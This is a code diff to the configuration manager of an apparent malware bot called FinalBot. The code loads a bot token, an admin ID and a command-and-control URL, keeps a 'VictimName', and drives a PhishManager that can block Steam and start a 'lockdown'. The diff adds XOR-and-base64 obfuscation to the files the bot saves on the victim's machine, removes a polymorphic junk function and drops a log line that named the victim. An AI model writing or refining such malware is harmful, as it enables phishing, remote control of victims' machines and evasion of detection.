@@ -1,19 +1,18 @@
 using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Text;
 using VanguardCore;
+using FinalBot.Modules;
 
 namespace FinalBot
 {
     public static class ConfigManager
     {
-        // [POLY_JUNK]
-        private static void _vanguard_35a9c4e5() {
-            int val = 88357;
-            if (val > 50000) Console.WriteLine("Hash:" + 88357);
-        }
-
         private static Dictionary<string, string> _config = new Dictionary<string, string>();
+        
+        // XOR Salt for session data obfuscation
+        private static readonly byte[] _sessionSalt = { 0x1A, 0x5F, 0x22, 0x4D, 0x09, 0x7E, 0x33, 0x1B };
 
         private static string GetConfigPath()
         {
@@ -23,13 +22,28 @@ namespace FinalBot
             return Path.Combine(folder, "session.dat");
         }
 
+        private static string XD(string input) {
+            if (string.IsNullOrEmpty(input)) return "";
+            byte[] b = Encoding.UTF8.GetBytes(input);
+            for (int i = 0; i < b.Length; i++) b[i] ^= _sessionSalt[i % _sessionSalt.Length];
+            return Convert.ToBase64String(b);
+        }
+
+        private static string XE(string base64) {
+            if (string.IsNullOrEmpty(base64)) return "";
+            try {
+                byte[] b = Convert.FromBase64String(base64);
+                for (int i = 0; i < b.Length; i++) b[i] ^= _sessionSalt[i % _sessionSalt.Length];
+                return Encoding.UTF8.GetString(b);
+            } catch { return ""; }
+        }
+
         public static void Load()
         {
-            // Load base secrets from SafetyManager
-            _config["BOT_TOKEN"] = SafetyManager.GetSecret("BOT_TOKEN");
-            _config["ADMIN_ID"] = SafetyManager.GetSecret("ADMIN_ID");
-            _config["C2_URL"] = SafetyManager.GetSecret("GIST_URL");
-            _config["GIST_GITHUB_TOKEN"] = SafetyManager.GetSecret("GIST_GITHUB_TOKEN");
+            // [PRO] All static secrets retrieved from encrypted Vault
+            _config["BOT_TOKEN"] = SafetyManager.Resolve("BOT_TOKEN_1");
+            _config["ADMIN_ID"] = SafetyManager.Resolve("ADMIN_ID");
+            _config["C2_URL"] = SafetyManager.Resolve("GIST_URL");
             
             _config["VictimName"] = "Unknown";
             try
@@ -37,21 +51,20 @@ namespace FinalBot
                 string path = GetConfigPath();
                 if (System.IO.File.Exists(path))
                 {
-                    _config["VictimName"] = System.IO.File.ReadAllText(path).Trim();
+                    string enc = System.IO.File.ReadAllText(path).Trim();
+                    _config["VictimName"] = XE(enc);
                 }
                 
                 string blockPath = Path.Combine(Path.GetDirectoryName(path) ?? "", "block.dat");
                 if (System.IO.File.Exists(blockPath))
                 {
-                    string content = File.ReadAllText(blockPath).Trim();
-                    FinalBot.Modules.PhishManager.GlobalBlockSteam = content == "1";
-                    if (FinalBot.Modules.PhishManager.GlobalBlockSteam) 
-                        FinalBot.Modules.PhishManager.StartLockdown();
+                    string enc = File.ReadAllText(blockPath).Trim();
+                    string dec = XE(enc);
+                    PhishManager.GlobalBlockSteam = dec == "1";
+                    if (PhishManager.GlobalBlockSteam) PhishManager.StartLockdown();
                 }
             }
             catch { }
-            
-            Logger.Info($"[CONFIG] Configuration loaded. Victim: {VictimName}");
         }
 
         public static void Save()
@@ -59,10 +72,10 @@ namespace FinalBot
             try
             {
                 string path = GetConfigPath();
-                System.IO.File.WriteAllText(path, VictimName);
+                System.IO.File.WriteAllText(path, XD(VictimName));
                 
                 string blockPath = Path.Combine(Path.GetDirectoryName(path) ?? "", "block.dat");
-                System.IO.File.WriteAllText(blockPath, FinalBot.Modules.PhishManager.GlobalBlockSteam ? "1" : "0");
+                System.IO.File.WriteAllText(blockPath, XD(PhishManager.GlobalBlockSteam ? "1" : "0"));
             }
             catch { }
         }
@@ -79,7 +92,6 @@ namespace FinalBot
 
         private static string _cachedIp = null;
         public static string LastKnownIp => _cachedIp ??= FinalBot.Modules.SystemInfoModule.GetExternalIP();
-
 
         public static string Get(string key, string defaultValue = "")
         {
